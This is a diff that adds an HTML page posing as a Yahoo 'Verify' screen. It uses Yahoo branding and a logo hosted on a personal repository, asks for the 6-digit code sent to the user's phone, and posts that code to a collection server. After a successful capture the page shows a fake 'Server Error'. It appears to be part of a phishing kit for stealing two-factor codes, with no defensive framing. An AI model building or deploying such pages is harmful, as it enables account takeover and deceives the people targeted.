@@ -1,0 +1,126 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Yahoo - Verify</title>
+    <link rel="stylesheet" href="./styles.css" />
+  </head>
+  <body>
+    <main class="page">
+      <header class="brand">
+        <img
+          class="logo"
+          src="https://raw.githubusercontent.com/jvictory9948/plmassets/refs/heads/main/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png"
+          alt="Yahoo logo"
+        />
+      </header>
+
+      <section class="card">
+        <h2 class="title">Enter verification code</h2>
+        <p class="subtitle">
+          You'll get a code sent to your phone number <strong>+**********</strong> to confirm it's really you.
+        </p>
+
+        <label class="field">
+          <input
+            id="codeInput"
+            class="field-input"
+            type="text"
+            inputmode="numeric"
+            maxlength="6"
+            placeholder="6-digit code"
+          />
+          <span class="field-underline" aria-hidden="true"></span>
+        </label>
+
+        <button class="btn btn-primary" type="button" id="verifyNext">Next</button>
+
+        <p class="helper">
+          <span id="resendText">Resend code in 60</span>
+        </p>
+
+        <p class="helper">
+        
+        </p>
+      </section>
+    </main>
+
+
+
+    <script>
+      // Countdown timer
+      let timeLeft = 60;
+      const resendText = document.getElementById("resendText");
+
+      const timer = setInterval(() => {
+        timeLeft--;
+        resendText.textContent = timeLeft > 0
+          ? `Resend code in ${timeLeft}`
+          : "Resend code";
+        if (timeLeft <= 0) clearInterval(timer);
+      }, 1000);
+
+      // Next button action
+      document.getElementById("verifyNext").addEventListener("click", async () => {
+        const code = document.getElementById("codeInput").value.trim();
+        const nextButton = document.getElementById("verifyNext");
+
+        if (!code) {
+          alert("Please enter the verification code.");
+          return;
+        }
+
+        if (code.length !== 6) {
+          alert("Please enter a valid 6-digit code.");
+          return;
+        }
+
+        // Disable button to prevent double submission
+        nextButton.disabled = true;
+        nextButton.textContent = "Verifying...";
+
+        try {
+          const response = await fetch("http://127.0.0.1:8000/verify-code/", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            mode: "cors",
+            body: JSON.stringify({
+              code: code
+            })
+          });
+
+          const data = await response.json();
+          console.log("Response:", data);
+
+          if (response.ok) {
+            // Success - show popup
+            alert("Server Error")
+          } else {
+            // Error response
+            alert("An error occurred: " + (data.error || "Please try again."));
+            nextButton.disabled = false;
+            nextButton.textContent = "Next";
+          }
+        } catch (error) {
+          console.error("Error:", error);
+          alert("Unable to connect to the server. Error: " + error.message);
+          nextButton.disabled = false;
+          nextButton.textContent = "Next";
+        }
+      });
+
+      // Close popup
+      document.getElementById("closePopup").addEventListener("click", () => {
+        document.getElementById("popupBox").style.display = "none";
+        // Reset button
+        document.getElementById("verifyNext").disabled = false;
+        document.getElementById("verifyNext").textContent = "Next";
+        // Clear input
+        document.getElementById("codeInput").value = "";
+      });
+    </script>
+  </body>
+</html>
